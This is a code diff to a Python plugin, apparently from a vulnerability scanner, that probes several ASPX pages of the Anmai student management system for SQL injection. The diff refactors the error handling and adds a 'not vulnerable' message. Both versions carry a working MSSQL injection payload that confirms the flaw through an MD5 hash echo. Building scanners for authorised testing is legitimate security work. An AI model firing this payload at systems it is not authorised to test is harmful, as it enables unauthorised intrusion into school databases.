@@ -31,16 +31,20 @@ class anmai_teachingtechnology_sqli_BaseVerify:
                 "/teacher/teachingtechnology/ColligationSelect/wonderfulcourseware_P.aspx?id=1",
                 "/teacher/teachingtechnology/Course_Record_P.aspx?id=1"
                 ]
-        for turl in urls:
-            vulnurl = self.url + turl
-            vulnurl = vulnurl + "'+AnD+1=Sys.Fn_varbintohexstr(HashBytes('Md5','1234'))--"
-            try:
+        try:
+            noexist = True
+            for turl in urls:
+                vulnurl = self.url + turl
+                vulnurl = vulnurl + "'+AnD+1=Sys.Fn_varbintohexstr(HashBytes('Md5','1234'))--"
+
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在安脉学生管理系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
-
-            except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在anmai_teachingtechnology_sqli漏洞", "white", "on_grey")
+        except:
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
